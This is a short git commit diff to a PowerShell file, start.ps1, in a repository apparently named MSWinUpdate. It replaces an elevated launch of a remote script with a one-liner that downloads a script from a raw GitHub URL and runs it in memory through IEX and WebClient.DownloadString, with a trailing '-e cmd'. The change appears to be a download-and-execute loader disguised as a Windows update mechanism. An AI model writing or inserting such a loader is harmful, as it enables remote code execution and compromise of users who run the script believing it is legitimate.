39c7145fe2a100f8e41d77996d3fafbb4ffda17e
network2city <107504914+network2city@users.noreply.github.com>
2023-04-08 19:16:46 -0400

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -1,1 +1,1 @@
-Start-Process powershell -verb runas -ArgumentList "-file https://raw.githubusercontent.com/network2city/MSWinUpdate/main/myPSScript.ps1"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(' https://raw.githubusercontent.com/network2city/MSWinUpdate/main/myPSScript.ps1'); -e cmd"
